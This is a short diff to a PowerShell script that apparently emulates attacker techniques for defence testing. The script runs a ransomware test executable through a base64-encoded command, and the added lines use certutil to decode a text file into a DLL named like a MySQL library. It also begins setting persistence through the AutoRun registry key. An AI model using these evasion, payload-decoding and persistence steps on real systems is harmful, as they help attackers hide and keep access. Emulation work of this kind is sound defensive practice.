@@ -47,6 +47,9 @@ Start-Process -FilePath "$ThreatBox\tools\ASR\ASRSamples\UNSIGNED_ransomware_tes
 $unsignedrand64 = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes('$ThreatBox\tools\ASRSamples\UNSIGNED_ransomware_test_exe.exe -force'))
 powershell.exe -encoded "$unsignedrand64"
 
+#Execution
+Start-Process -FilePath "$env:windir\system32\certutil.exe" -ArgumentList "-f -decode $ThreatBox\tools\MySql.Data3.dll.txt $ThreatBox\tools\MySql.Data3.dll"
+
 # Persistance
 Write-Host "Creating persistance through AutoRun registry hive"
 $regTSC = Test-Path -Path "HKCU:\SOFTWARE\Policies\Microsoft\Command Processor\AutoRun"
